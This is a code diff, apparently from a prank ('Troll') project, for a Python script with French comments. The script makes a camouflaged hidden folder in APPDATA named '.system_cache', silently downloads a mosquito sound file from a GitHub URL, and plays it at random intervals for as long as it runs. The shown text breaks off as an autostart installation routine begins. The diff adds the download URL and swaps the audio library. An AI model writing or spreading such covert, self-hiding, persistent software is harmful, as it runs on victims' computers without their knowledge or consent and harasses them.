@@ -2,32 +2,28 @@ import os
 import random
 import time
 import urllib.request
-import pygame
+import winsound
 from threading import Thread
 
 def download_and_play():
     # Création du dossier système camouflé
     hidden_dir = os.path.join(os.getenv('APPDATA'), '.system_cache')
-    sound_file = os.path.join(hidden_dir, 'system_sound.mp3')
+    sound_file = os.path.join(hidden_dir, 'system_sound.wav')  # Changé en .wav pour winsound
 
     if not os.path.exists(hidden_dir):
         os.makedirs(hidden_dir)
 
     # Téléchargement discret du fichier audio
     if not os.path.exists(sound_file):
-        url = "VOTRE_URL_GITHUB_ICI"  # Remplacer par votre URL raw GitHub
+        url = "https://github.com/7ShIkI3/Troll/blob/main/bruitage%20moustique.wav"  # Assurez-vous d'avoir un .wav
         urllib.request.urlretrieve(url, sound_file)
-
-    pygame.mixer.init()
 
     while True:
         delay = random.randint(300, 3600)  # Délai entre 5min et 1h
         time.sleep(delay)
 
-        pygame.mixer.music.load(sound_file)
-        pygame.mixer.music.play()
-        while pygame.mixer.music.get_busy():
-            pygame.time.Clock().tick(10)
+        # Lecture du son avec winsound
+        winsound.PlaySound(sound_file, winsound.SND_FILENAME)
 
 def autostart():
     # Installation au démarrage
